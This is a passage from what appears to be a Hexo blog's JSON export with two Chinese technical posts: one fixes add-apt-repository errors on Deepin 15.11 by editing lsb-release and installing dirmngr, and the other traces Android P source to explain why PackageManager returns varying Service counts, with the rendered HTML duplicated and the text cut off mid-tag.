> gpg: keyserver receive failed: No dirmngr\n\n4. 不要慌，他说没有dirmngr，我们就安一个：\n\n   ```bash\n   sudo apt-get install dirmngr\n   ```\n\n最后再add仓库ppa就不会报错了。\n搞定之后，就能顺利安装最新的git：\n\n```bash\nsudo apt-get update\nsudo apt-get install git\n```\n","slug":"Deepin系统add-apt-repository失败的问题","published":1,"updated":"2024-03-25T07:31:25.857Z","comments":1,"photos":[],"link":"","_id":"cluaufh0r001kthe6d075dmfy","content":"<blockquote>\n<p>不只是安装software-properties-common那么简单……</p>\n</blockquote>\n<hr>\n<h4 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h4><p>目前Deepin系统版本为15.11，貌似在15.10时切到了Debain的软件仓库，而不再是Ubuntu了，虽说比较稳定，但还不够新，比如git，版本就没有官方的新。<br>于是我尝试 <a href=\"https://git-scm.com/download/linux\">git官方的办法</a>：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo add-apt-repository ppa:git-core/ppa</span><br></pre></td></tr></table></figure>\n\n<p>报错，提示未找到命令。</p>\n<h4 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h4><p>这个问题在网上搜搜办法，很多回答都是让安装一个包：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install software-properties-common</span><br></pre></td></tr></table></figure>\n\n<p>是的，确实解决了 <strong>add-apt-repository</strong> 命令找不到的问题，但实际add仓库源时，还是会出错，你可能会看到如下内容：</p>\n<blockquote>\n<p>Traceback (most recent call last):<br>  File “&#x2F;usr&#x2F;bin&#x2F;add-apt-repository”, line 95, in <module><br>    sp &#x3D; SoftwareProperties(options&#x3D;options)<br>  File “&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;softwareproperties&#x2F;SoftwareProperties.py”, line 109, in <strong>init</strong><br>    self.reload_sourceslist()<br>  File “&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;softwareproperties&#x2F;SoftwareProperties.py”, line 599, in reload_sourceslist<br>    self.distro.get_sources(self.sourceslist)<br>  File “&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;aptsources&#x2F;distro.py”, line 93, in get_sources<br>    (self.id, self.codename))<br>aptsources.distro.NoDistroTemplateException: Error: could not find a distribution template for Deepin&#x2F;stable</p>\n</blockquote>\n<p>很尴尬啊兄弟！看这个报错就大概明白，还是因为Deepin&#x2F;stable不适用这种三方ppa导致的。</p>\n<p>我可不想就此放弃，经过一番仔细搜寻，找到一个<a href=\"https://bbs.deepin.org/forum.php?mod=viewthread&tid=177967\">大佬的解决办法</a>：</p>\n<ol>\n<li><p>编辑lsb-release文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo deepin-editor /etc/lsb-release</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>把已有内容的每行头加#注释掉，添加Ubuntu相关的内容：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># DISTRIB_ID=Deepin</span></span><br><span class=\"line\"><span class=\"comment\"># DISTRIB_RELEASE=&quot;15.11&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># DISTRIB_DESCRIPTION=&quot;Deepin 15.11 &quot;</span></span><br><span class=\"line\"><span class=\"comment\"># DISTRIB_CODENAME=stable</span></span><br><span class=\"line\"></span><br><span class=\"line\">DISTRIB_ID=Ubuntu</span><br><span class=\"line\">DISTRIB_RELEASE=16.04</span><br><span class=\"line\">DISTRIB_DESCRIPTION=<span class=\"string\">&quot;Ubuntu 16.04.6 LTS&quot;</span></span><br><span class=\"line\">DISTRIB_CODENAME=trusty</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>此时再试试 <strong>sudo add-apt-repository ppa:git-core&#x2F;ppa</strong> 看看，却报了另一个错：</p>\n<blockquote>\n<p>The most current stable version of Git for Ubuntu.</p>\n<p>For release candidates, go to <a href=\"https://launchpad.net/~git-core/+archive/candidate\">https://launchpad.net/~git-core/+archive/candidate</a> .<br>More info: <a href=\"https://launchpad.net/~git-core/+archive/ubuntu/ppa\">https://launchpad.net/~git-core/+archive/ubuntu/ppa</a><br>Press [ENTER] to continue or ctrl-c to cancel adding it</p>\n<p>gpg: keybox ‘&#x2F;tmp&#x2F;tmprpx7ycut&#x2F;pubring.gpg’ created<br>gpg: failed to start the dirmngr ‘&#x2F;usr&#x2F;bin&#x2F;dirmngr’: 没有那个文件或目录<br>gpg: connecting dirmngr at ‘&#x2F;tmp&#x2F;tmprpx7ycut&#x2F;S.dirmngr’ failed: 没有那个文件或目录<br>gpg: keyserver receive failed: No dirmngr</p>\n</blockquote>\n</li>\n<li><p>不要慌，他说没有dirmngr，我们就安一个：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install dirmngr</span><br></pre></td></tr></table></figure></li>\n</ol>\n<p>最后再add仓库ppa就不会报错了。<br>搞定之后，就能顺利安装最新的git：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get update</span><br><span class=\"line\">sudo apt-get install git</span><br></pre></td></tr></table></figure>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<blockquote>\n<p>不只是安装software-properties-common那么简单……</p>\n</blockquote>\n<hr>\n<h4 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h4><p>目前Deepin系统版本为15.11，貌似在15.10时切到了Debain的软件仓库，而不再是Ubuntu了，虽说比较稳定，但还不够新，比如git，版本就没有官方的新。<br>于是我尝试 <a href=\"https://git-scm.com/download/linux\">git官方的办法</a>：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo add-apt-repository ppa:git-core/ppa</span><br></pre></td></tr></table></figure>\n\n<p>报错，提示未找到命令。</p>\n<h4 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h4><p>这个问题在网上搜搜办法，很多回答都是让安装一个包：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install software-properties-common</span><br></pre></td></tr></table></figure>\n\n<p>是的，确实解决了 <strong>add-apt-repository</strong> 命令找不到的问题，但实际add仓库源时，还是会出错，你可能会看到如下内容：</p>\n<blockquote>\n<p>Traceback (most recent call last):<br>  File “&#x2F;usr&#x2F;bin&#x2F;add-apt-repository”, line 95, in <module><br>    sp &#x3D; SoftwareProperties(options&#x3D;options)<br>  File “&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;softwareproperties&#x2F;SoftwareProperties.py”, line 109, in <strong>init</strong><br>    self.reload_sourceslist()<br>  File “&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;softwareproperties&#x2F;SoftwareProperties.py”, line 599, in reload_sourceslist<br>    self.distro.get_sources(self.sourceslist)<br>  File “&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;aptsources&#x2F;distro.py”, line 93, in get_sources<br>    (self.id, self.codename))<br>aptsources.distro.NoDistroTemplateException: Error: could not find a distribution template for Deepin&#x2F;stable</p>\n</blockquote>\n<p>很尴尬啊兄弟！看这个报错就大概明白，还是因为Deepin&#x2F;stable不适用这种三方ppa导致的。</p>\n<p>我可不想就此放弃，经过一番仔细搜寻，找到一个<a href=\"https://bbs.deepin.org/forum.php?mod=viewthread&tid=177967\">大佬的解决办法</a>：</p>\n<ol>\n<li><p>编辑lsb-release文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo deepin-editor /etc/lsb-release</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>把已有内容的每行头加#注释掉，添加Ubuntu相关的内容：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># DISTRIB_ID=Deepin</span></span><br><span class=\"line\"><span class=\"comment\"># DISTRIB_RELEASE=&quot;15.11&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># DISTRIB_DESCRIPTION=&quot;Deepin 15.11 &quot;</span></span><br><span class=\"line\"><span class=\"comment\"># DISTRIB_CODENAME=stable</span></span><br><span class=\"line\"></span><br><span class=\"line\">DISTRIB_ID=Ubuntu</span><br><span class=\"line\">DISTRIB_RELEASE=16.04</span><br><span class=\"line\">DISTRIB_DESCRIPTION=<span class=\"string\">&quot;Ubuntu 16.04.6 LTS&quot;</span></span><br><span class=\"line\">DISTRIB_CODENAME=trusty</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>此时再试试 <strong>sudo add-apt-repository ppa:git-core&#x2F;ppa</strong> 看看，却报了另一个错：</p>\n<blockquote>\n<p>The most current stable version of Git for Ubuntu.</p>\n<p>For release candidates, go to <a href=\"https://launchpad.net/~git-core/+archive/candidate\">https://launchpad.net/~git-core/+archive/candidate</a> .<br>More info: <a href=\"https://launchpad.net/~git-core/+archive/ubuntu/ppa\">https://launchpad.net/~git-core/+archive/ubuntu/ppa</a><br>Press [ENTER] to continue or ctrl-c to cancel adding it</p>\n<p>gpg: keybox ‘&#x2F;tmp&#x2F;tmprpx7ycut&#x2F;pubring.gpg’ created<br>gpg: failed to start the dirmngr ‘&#x2F;usr&#x2F;bin&#x2F;dirmngr’: 没有那个文件或目录<br>gpg: connecting dirmngr at ‘&#x2F;tmp&#x2F;tmprpx7ycut&#x2F;S.dirmngr’ failed: 没有那个文件或目录<br>gpg: keyserver receive failed: No dirmngr</p>\n</blockquote>\n</li>\n<li><p>不要慌，他说没有dirmngr，我们就安一个：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install dirmngr</span><br></pre></td></tr></table></figure></li>\n</ol>\n<p>最后再add仓库ppa就不会报错了。<br>搞定之后，就能顺利安装最新的git：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get update</span><br><span class=\"line\">sudo apt-get install git</span><br></pre></td></tr></table></figure>\n"},{"layout":"post","title":"源码茶舍之PackageManager获取注册Service数量问题","subtitle":"多查查，也不难。","date":"2019-11-01T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n### 问题\n\n今天有朋友遇到个问题，说bindService失败了，查了几步发现是由于PackageManager获取不到对应的Service组件导致的。具体示例代码如下：\n\n```kotlin\nval serviceInfos = packageManager.getPackageInfo(\"com.xxx.xxx\", PackageManager.GET_SERVICES).services\nLog.d(\"TEST\", Arrays.toString(serviceInfos))\n```\n\n这里我们通过PackageManager获取到对应包名的PackageInfo，最终的serviceInfos是一个数组，包含**该应用注册的所有Service组件**。\n但不同时候打印出来的数组长度竟然不同，也就是说某些Service一会儿有一会儿没有，这是为什么呢？\n\n### 溯源\n\n要搞清楚上面的问题，我们就要追本溯源啦！**在追踪的过程中我们时刻记得留意一切可能使services数组发生变化的逻辑**。\n\n> 提示：以下Android系统源码均基于Android P。\n\n先看看PackageInfo的源码中对services成员的注释描述：\n\n```java\n/**\n * Array of all {@link android.R.styleable#AndroidManifestService\n * &lt;service&gt;} tags included under &lt;application&gt;,\n * or null if there were none.  This is only filled in if the flag\n * {@link PackageManager#GET_SERVICES} was set.\n */\npublic ServiceInfo[] services;\n```\n\n可以看出，这里只提到了该数组包含AndroidManifest.xml中注册的所有Service组件，并没有说明有何具体过滤限制。那我们就只能从services赋值的源头找寻了。\n\nPackageManager只是一层API，我们需要看它对应的系统服务，那么就是PackageManagerService，getPackageInfo相关方法：\n\n```java\n@Override\npublic PackageInfo getPackageInfo(String packageName, int flags, int userId) {\n    return getPackageInfoInternal(packageName, PackageManager.VERSION_CODE_HIGHEST,\n            flags, Binder.getCallingUid(), userId);\n}\n\n// 实际的内部方法，这里做了代码精简，只保留关键部分\nprivate PackageInfo getPackageInfoInternal(String packageName, long versionCode,\n        int flags, int filterCallingUid, int userId) {\n    // ...\n\n    // reader\n    synchronized (mPackages) {\n        // Normalize package name to handle renamed packages and static libs\n        packageName = resolveInternalPackageNameLPr(packageName, versionCode);\n\n        final boolean matchFactoryOnly = (flags & MATCH_FACTORY_ONLY) != 0;\n        if (matchFactoryOnly) {\n            final PackageSetting ps = mSettings.getDisabledSystemPkgLPr(packageName);\n            if (ps != null) {\n                // ...\n                return generatePackageInfo(ps, flags, userId); // 生成PackageInfo实例\n            }\n        }\n\n        PackageParser.Package p = mPackages.get(packageName);\n        // ...\n        if (!matchFactoryOnly && (flags & MATCH_KNOWN_PACKAGES) != 0) {\n            final PackageSetting ps = mSettings.mPackages.get(packageName);\n            // ...\n            return generatePackageInfo(ps, flags, userId); // 生成PackageInfo实例\n        }\n    }\n}\n```\n\n从getPackageInfoInternal方法的源码来看还只是一些权限校验和匹配，没有涉及到具体组件信息生成的逻辑，所以我们继续看generatePackageInfo方法：\n\n```java\nprivate PackageInfo generatePackageInfo(PackageSetting ps, int flags, int userId) {\n    // ...\n    if (p != null) {\n        // ...\n        PackageInfo packageInfo = PackageParser.generatePackageInfo(p, gids, flags,\n                ps.firstInstallTime, ps.lastUpdateTime, permissions, state, userId);\n        // ...\n        return packageInfo;\n// ...\n```\n\n同样地，我们只保留关键代码，可以看到生成PackageInfo的过程实际上是由PackageParser来处理。而且，到这里flags都还没解析判断呢，系统怎么知道我需要获取的是什么组件呢是吧？没错，最终逻辑基本都在PackageParser的相关方法里了：\n\n```java\npublic static PackageInfo generatePackageInfo(PackageParser.Package p,\n        int gids[], int flags, long firstInstallTime, long lastUpdateTime,\n        Set<String> grantedPermissions, PackageUserState state, int userId) {\n    // ...\n    PackageInfo pi = new PackageInfo();\n    pi.packageName = p.packageName;\n    // ...\n    if ((flags & PackageManager.GET_SERVICES) != 0) {\n        // 这里的N就等于Manifest文件中实际声明的Service的数量\n        final int N = p.services.size();\n        if (N > 0) {\n            int num = 0;\n            final ServiceInfo[] res = new ServiceInfo[N];\n            for (int i = 0; i < N; i++) {\n                final Service s = p.services.get(i);\n                // 关键就在这个判断，决定了哪些Service组件会被过滤掉\n                if (state.isMatch(s.info, flags)) {\n                    res[num++] = generateServiceInfo(s, flags, state, userId);\n                }\n            }\n            // 由于返回的数组长度并不一定等于N，所以还需要专门trim一下数组\n            pi.services = ArrayUtils.trimToSize(res, num);\n        }\n    }\n    // ...\n    return pi;\n}\n```\n\n总算是找到老巢了，可以看到，最终返回的是pi对象，和传进来的p是不一样的。相关逻辑也很简单，从我的源码注释里可得知ServiceInfo数组之所以会发生变化，就是因为那个 **isMatch** 方法，如果它返回了false，那么这个Service组件不会返回给外部了。\n继续深入，找到这个PackageUserState的isMatch方法：\n\n```java\n/**\n * Test if the given component is considered installed, enabled and a match\n * for the given flags.\n *\n * <p>\n * Expects at least one of {@link PackageManager#MATCH_DIRECT_BOOT_AWARE} and\n * {@link PackageManager#MATCH_DIRECT_BOOT_UNAWARE} are specified in {@code flags}.\n * </p>\n */\npublic boolean isMatch(ComponentInfo componentInfo, int flags) {\n    final boolean isSystemApp = componentInfo.applicationInfo.isSystemApp();\n    final boolean matchUninstalled = (flags & PackageManager.MATCH_KNOWN_PACKAGES) != 0;\n    if (!isAvailable(flags)\n            && !(isSystemApp && matchUninstalled)) return false;\n    if (!isEnabled(componentInfo, flags)) return false; // 重点关注\n\n    if ((flags & MATCH_SYSTEM_ONLY) != 0) {\n        if (!isSystemApp) {\n            return false;\n        }\n    }\n\n    final boolean matchesUnaware = ((flags & MATCH_DIRECT_BOOT_UNAWARE) != 0)\n            && !componentInfo.directBootAware;\n    final boolean matchesAware = ((flags & MATCH_DIRECT_BOOT_AWARE) != 0)\n            && componentInfo.directBootAware;\n    return matchesUnaware || matchesAware; // 重点关注\n}\n```\n\n哟，瞧瞧，这限制真的不少啊。对于三方非系统应用来说，我们暂时只用关心两个return分支。\n\n### 解决\n\n从上述的isMatch源码来分析问题排查办法。\n\n第一个即isEnabled的检查，这个我们可以对应Service组件中的 `android:enabled` 属性，也就是说当你的组件被禁用时，那么对应Service的ServiceInfo就不会返回给外部了，这个很好理解，组件不可用时，外部肯定不能获取其信息，所以你要去bindService之类的操作肯定是抛异常的。当然，此属性默认值是true，但我们不排除业务逻辑中有动态设置false的可能，这个具体参考PackageManager的**setComponentEnabledSetting**方法，此处不赘述。\n\n第二个即组件**direct-boot**（直接启动模式）的相关设置，这是从7.1之后出现的特性，对应 `android:directBootAware` 属性，该属性默认是false，即不支持该模式，那么很可能你的应用在设备加密锁屏后获取不到所需要的Service组件。可将**directBootAware**属性设为**true**后再尝试是否能解决本文问题，若涉及到Context的，还需要额外操作，具体参考谷歌官方文档中对直接启动模式的详细介绍和适配方式：[https://developer.android.com/training/articles/direct-boot.html](https://developer.android.com/training/articles/direct-boot.html)。\n","source":"_posts/2019-11-02-源码茶舍之PackageManager获取注册Service数量问题.md","raw":"---\nlayout:     post\ntitle:      源码茶舍之PackageManager获取注册Service数量问题\nsubtitle:   多查查，也不难。\ndate:       2019-11-02\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Android\n    - AOSP\n---\n\n### 问题\n\n今天有朋友遇到个问题，说bindService失败了，查了几步发现是由于PackageManager获取不到对应的Service组件导致的。具体示例代码如下：\n\n```kotlin\nval serviceInfos = packageManager.getPackageInfo(\"com.xxx.xxx\", PackageManager.GET_SERVICES).services\nLog.d(\"TEST\", Arrays.toString(serviceInfos))\n```\n\n这里我们通过PackageManager获取到对应包名的PackageInfo，最终的serviceInfos是一个数组，包含**该应用注册的所有Service组件**。\n但不同时候打印出来的数组长度竟然不同，也就是说某些Service一会儿有一会儿没有，这是为什么呢？\n\n### 溯源\n\n要搞清楚上面的问题，我们就要追本溯源啦！**在追踪的过程中我们时刻记得留意一切可能使services数组发生变化的逻辑**。\n\n> 提示：以下Android系统源码均基于Android P。\n\n先看看PackageInfo的源码中对services成员的注释描述：\n\n```java\n/**\n * Array of all {@link android.R.styleable#AndroidManifestService\n * &lt;service&gt;} tags included under &lt;application&gt;,\n * or null if there were none.  This is only filled in if the flag\n * {@link PackageManager#GET_SERVICES} was set.\n */\npublic ServiceInfo[] services;\n```\n\n可以看出，这里只提到了该数组包含AndroidManifest.xml中注册的所有Service组件，并没有说明有何具体过滤限制。那我们就只能从services赋值的源头找寻了。\n\nPackageManager只是一层API，我们需要看它对应的系统服务，那么就是PackageManagerService，getPackageInfo相关方法：\n\n```java\n@Override\npublic PackageInfo getPackageInfo(String packageName, int flags, int userId) {\n    return getPackageInfoInternal(packageName, PackageManager.VERSION_CODE_HIGHEST,\n            flags, Binder.getCallingUid(), userId);\n}\n\n// 实际的内部方法，这里做了代码精简，只保留关键部分\nprivate PackageInfo getPackageInfoInternal(String packageName, long versionCode,\n        int flags, int filterCallingUid, int userId) {\n    // ...\n\n    // reader\n    synchronized (mPackages) {\n        // Normalize package name to handle renamed packages and static libs\n        packageName = resolveInternalPackageNameLPr(packageName, versionCode);\n\n        final boolean matchFactoryOnly = (flags & MATCH_FACTORY_ONLY) != 0;\n        if (matchFactoryOnly) {\n            final PackageSetting ps = mSettings.getDisabledSystemPkgLPr(packageName);\n            if (ps != null) {\n                // ...\n                return generatePackageInfo(ps, flags, userId); // 生成PackageInfo实例\n            }\n        }\n\n        PackageParser.Package p = mPackages.get(packageName);\n        // ...\n        if (!matchFactoryOnly && (flags & MATCH_KNOWN_PACKAGES) != 0) {\n            final PackageSetting ps = mSettings.mPackages.get(packageName);\n            // ...\n            return generatePackageInfo(ps, flags, userId); // 生成PackageInfo实例\n        }\n    }\n}\n```\n\n从getPackageInfoInternal方法的源码来看还只是一些权限校验和匹配，没有涉及到具体组件信息生成的逻辑，所以我们继续看generatePackageInfo方法：\n\n```java\nprivate PackageInfo generatePackageInfo(PackageSetting ps, int flags, int userId) {\n    // ...\n    if (p != null) {\n        // ...\n        PackageInfo packageInfo = PackageParser.generatePackageInfo(p, gids, flags,\n                ps.firstInstallTime, ps.lastUpdateTime, permissions, state, userId);\n        // ...\n        return packageInfo;\n// ...\n```\n\n同样地，我们只保留关键代码，可以看到生成PackageInfo的过程实际上是由PackageParser来处理。而且，到这里flags都还没解析判断呢，系统怎么知道我需要获取的是什么组件呢是吧？没错，最终逻辑基本都在PackageParser的相关方法里了：\n\n```java\npublic static PackageInfo generatePackageInfo(PackageParser.Package p,\n        int gids[], int flags, long firstInstallTime, long lastUpdateTime,\n        Set<String> grantedPermissions, PackageUserState state, int userId) {\n    // ...\n    PackageInfo pi = new PackageInfo();\n    pi.packageName = p.packageName;\n    // ...\n    if ((flags & PackageManager.GET_SERVICES) != 0) {\n        // 这里的N就等于Manifest文件中实际声明的Service的数量\n        final int N = p.services.size();\n        if (N > 0) {\n            int num = 0;\n            final ServiceInfo[] res = new ServiceInfo[N];\n            for (int i = 0; i < N; i++) {\n                final Service s = p.services.get(i);\n                // 关键就在这个判断，决定了哪些Service组件会被过滤掉\n                if (state.isMatch(s.info, flags)) {\n                    res[num++] = generateServiceInfo(s, flags, state, userId);\n                }\n            }\n            // 由于返回的数组长度并不一定等于N，所以还需要专门trim一下数组\n            pi.services = ArrayUtils.trimToSize(res, num);\n        }\n    }\n    // ...\n    return pi;\n}\n```\n\n总算是找到老巢了，可以看到，最终返回的是pi对象，和传进来的p是不一样的。相关逻辑也很简单，从我的源码注释里可得知ServiceInfo数组之所以会发生变化，就是因为那个 **isMatch** 方法，如果它返回了false，那么这个Service组件不会返回给外部了。\n继续深入，找到这个PackageUserState的isMatch方法：\n\n```java\n/**\n * Test if the given component is considered installed, enabled and a match\n * for the given flags.\n *\n * <p>\n * Expects at least one of {@link PackageManager#MATCH_DIRECT_BOOT_AWARE} and\n * {@link PackageManager#MATCH_DIRECT_BOOT_UNAWARE} are specified in {@code flags}.\n * </p>\n */\npublic boolean isMatch(ComponentInfo componentInfo, int flags) {\n    final boolean isSystemApp = componentInfo.applicationInfo.isSystemApp();\n    final boolean matchUninstalled = (flags & PackageManager.MATCH_KNOWN_PACKAGES) != 0;\n    if (!isAvailable(flags)\n            && !(isSystemApp && matchUninstalled)) return false;\n    if (!isEnabled(componentInfo, flags)) return false; // 重点关注\n\n    if ((flags & MATCH_SYSTEM_ONLY) != 0) {\n        if (!isSystemApp) {\n            return false;\n        }\n    }\n\n    final boolean matchesUnaware = ((flags & MATCH_DIRECT_BOOT_UNAWARE) != 0)\n            && !componentInfo.directBootAware;\n    final boolean matchesAware = ((flags & MATCH_DIRECT_BOOT_AWARE) != 0)\n            && componentInfo.directBootAware;\n    return matchesUnaware || matchesAware; // 重点关注\n}\n```\n\n哟，瞧瞧，这限制真的不少啊。对于三方非系统应用来说，我们暂时只用关心两个return分支。\n\n### 解决\n\n从上述的isMatch源码来分析问题排查办法。\n\n第一个即isEnabled的检查，这个我们可以对应Service组件中的 `android:enabled` 属性，也就是说当你的组件被禁用时，那么对应Service的ServiceInfo就不会返回给外部了，这个很好理解，组件不可用时，外部肯定不能获取其信息，所以你要去bindService之类的操作肯定是抛异常的。当然，此属性默认值是true，但我们不排除业务逻辑中有动态设置false的可能，这个具体参考PackageManager的**setComponentEnabledSetting**方法，此处不赘述。\n\n第二个即组件**direct-boot**（直接启动模式）的相关设置，这是从7.1之后出现的特性，对应 `android:directBootAware` 属性，该属性默认是false，即不支持该模式，那么很可能你的应用在设备加密锁屏后获取不到所需要的Service组件。可将**directBootAware**属性设为**true**后再尝试是否能解决本文问题，若涉及到Context的，还需要额外操作，具体参考谷歌官方文档中对直接启动模式的详细介绍和适配方式：[https://developer.android.com/training/articles/direct-boot.html](https://developer.android.com/training/articles/direct-boot.html)。\n","slug":"源码茶舍之PackageManager获取注册Service数量问题","published":1,"updated":"2024-03-25T07:31:25.857Z","comments":1,"photos":[],"link":"","_id":"cluaufh0s001nthe6cxqb2uzs","content":"<h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><p>今天有朋友遇到个问题，说bindService失败了，查了几步发现是由于PackageManager获取不到对应的Service组件导致的。具体示例代码如下：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">val</span> serviceInfos = packageManager.getPackageInfo(<span class=\"string\">&quot;com.xxx.xxx&quot;</span>, PackageManager.GET_SERVICES).services</span><br><span class=\"line\">Log.d(<span class=\"string\">&quot;TEST&quot;</span>, Arrays.toString(serviceInfos))</span><br></pre></td></tr></table></figure>\n\n<p>这里我们通过PackageManager获取到对应包名的PackageInfo，最终的serviceInfos是一个数组，包含<strong>该应用注册的所有Service组件</strong>。<br>但不同时候打印出来的数组长度竟然不同，也就是说某些Service一会儿有一会儿没有，这是为什么呢？</p>\n<h3 id=\"溯源\"><a href=\"#溯源\" class=\"headerlink\" title=\"溯源\"></a>溯源</h3><p>要搞清楚上面的问题，我们就要追本溯源啦！<strong>在追踪的过程中我们时刻记得留意一切可能使services数组发生变化的逻辑</strong>。</p>\n<blockquote>\n<p>提示：以下Android系统源码均基于Android P。</p>\n</blockquote>\n<p>先看看PackageInfo的源码中对services成员的注释描述：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Array of all &#123;<span class=\"doctag\">@link</span> android.R.styleable#AndroidManifestService</span></span><br><span class=\"line\"><span class=\"comment\"> * &amp;lt;service&amp;gt;&#125; tags included under &amp;lt;application&amp;gt;,</span></span><br><span class=\"line\"><span class=\"comment\"> * or null if there were none.  This is only filled in if the flag</span></span><br><span class=\"line\"><span class=\"comment\"> * &#123;<span class=\"doctag\">@link</span> PackageManager#GET_SERVICES&#125; was set.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> ServiceInfo[] services;</span><br></pre></td></tr></table></figure>\n\n<p>可以看出，这里只提到了该数组包含AndroidManifest.xml中注册的所有Service组件，并没有说明有何具体过滤限制。那我们就只能从services赋值的源头找寻了。</p>\n<p>PackageManager只是一层API，我们需要看它对应的系统服务，那么就是PackageManagerService，getPackageInfo相关方法：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> PackageInfo <span class=\"title function_\">getPackageInfo</span><span class=\"params\">(String packageName, <span class=\"type\">int</span> flags, <span class=\"type\">int</span> userId)</span> &#123;</span><br><span class=\"line\">    <span 